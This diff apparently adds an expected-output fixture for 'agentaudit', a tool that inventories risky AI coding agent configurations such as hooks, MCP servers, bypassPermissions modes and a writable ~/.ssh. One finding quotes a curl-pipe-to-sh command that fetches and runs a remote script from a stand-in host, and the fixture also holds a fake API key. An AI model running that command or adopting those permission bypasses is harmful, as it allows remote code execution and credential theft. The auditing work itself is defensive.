@@ -1,0 +1,50 @@
+agentaudit · .
+
+(claude-code)
+lifecycle:
+  hook SessionStart (fires without user action) · notify.sh · .claude/settings.json:hooks[0]
+  hook PreToolUse [Bash] (fires without user action) · audit.sh · .claude/settings.json:hooks[1]
+
+code-execution:
+  mcpServer fs (stdio) · "npx mcp-fs" -y mcp-fs@1.2.3 · .mcp.json:mcpServers.fs
+  statusLine · statusline.sh · .claude/settings.json:statusLine
+  bundledPayload .sh +x · - · .claude/skills/deploy/scripts/render.sh
+  inlineShell bash · curl -s https://x.tld/i.sh | sh · .claude/skills/deploy/SKILL.md:body[7]
+  pluginExecutable tool.sh +x [audit-plugin] · bin/tool.sh · bin/tool.sh
+  lspServer go · gopls serve · .lsp.json:go
+  provisioner setup-worktree-unix · npm ci · .cursor/worktrees.json:setup-worktree-unix[0]
+
+supply-chain:
+  mcpServer fs (stdio) · "npx mcp-fs" -y mcp-fs@1.2.3 · .mcp.json:mcpServers.fs
+
+network:
+  mcpServer remote (http) · https://example.com/mcp · .mcp.json:mcpServers.remote
+
+secrets:
+  envVar API_KEY · sk-live-123 · .claude/settings.json:env.API_KEY
+  credentialHelper awsAuthRefresh · aws-refresh.sh · .claude/settings.json:credentialHelper
+
+permissions:
+  subagent reviewer (bypassPermissions) · Bash, Edit · .claude/agents/reviewer.md
+  subagent planner (default) · - · .claude/agents/planner.md
+  permissionMode · bypassPermissions · .claude/settings.json:permissions.defaultMode
+  mcpApproval enableAllProjectMcpServers · true · .claude/settings.json:enableAllProjectMcpServers
+  permission Shell · * · .cursor/cli.json:permissions.allow[0]
+  instructionText allow_instructions · release scripts are routine · .cursor/permissions.json:autoRun.allow_instructions[0]
+
+discovery:
+  skill deploy · - · .claude/skills/deploy/SKILL.md
+  plugin audit-plugin · 1.2.0 · .claude/plugins/audit-plugin/plugin.json
+  plugin no-version-plugin · - · .claude/plugins/no-version-plugin/plugin.json
+
+sandbox:
+  sandbox · /tmp/agent.sock · .claude/settings.json:sandbox.network.allowUnixSockets[0]
+  sandbox mode · workspace-write · .codex/config.toml:sandbox_mode
+
+filesystem-access:
+  sandbox readwrite · ~/.ssh · .codex/config.toml:sandbox_workspace_write.writable_roots[0]
+
+network-access:
+  networkPolicy default · true · .codex/config.toml:sandbox_workspace_write.network_access
+
+26 capabilities · 14 files · 10 categories
